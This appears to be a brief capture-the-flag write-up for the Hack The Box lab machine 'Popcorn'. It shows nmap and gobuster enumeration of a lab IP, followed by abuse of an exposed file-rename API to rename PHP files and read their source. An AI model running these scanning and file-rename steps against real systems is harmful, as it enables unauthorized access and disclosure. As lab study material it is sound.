# Popcorn
- Target IP: 10.129.24.130

# Recon
```bash
nmap -iL scope.txt -p- -oA Nmap/All --open -Pn

# 22, 80 TCP open
```

```bash
nmap -iL scope.txt -p80 -sCV -oA Nmap/sCV-80 --open -Pn

# Output
# Apache httpd 2.2.12
# http-title: Did not follow redirect to http://popcorn.htb/
# Service Info: Host: popcorn.hackthebox.gr
# /etc/hosts >> 10.129.24.130 popcorn.htb popcorn.hackthebox.gr
```

```bash
gobuster dir \ 
-w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt \ 
--url http://popcorn.htb/

# Output
# /test -> phpinfo()
# /index -> "It works!" page
# /torrent -> Torent Hoster
# /rename -> Renamer API Syntax: http://popcorn.htb/rename/index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name
```

```
POST /torrent/users/index.php?mode=register HTTP/1.1
Host: popcorn.htb

username=admin&password=admin&password2=admin&email=admin%40admin.htb&number=d5e42

--- Response
<div class="normal" id="news">-The username <b>admin</b> already exists</div>
```

```
GET /rename/indexs.php?filename=/var/www/rename/index.php&newfilename=/var/www/rename/indexs.php HTTP/1.1

--- Response
HTTP/1.1 200 OK
OK!
```

```
GET /rename/indexs.php?filename=/var/www/torrent/torrents.php&newfilename=/var/www/torrent/torrents.php.txt HTTP/1.1

# Allows us to read the source of torrents.php
```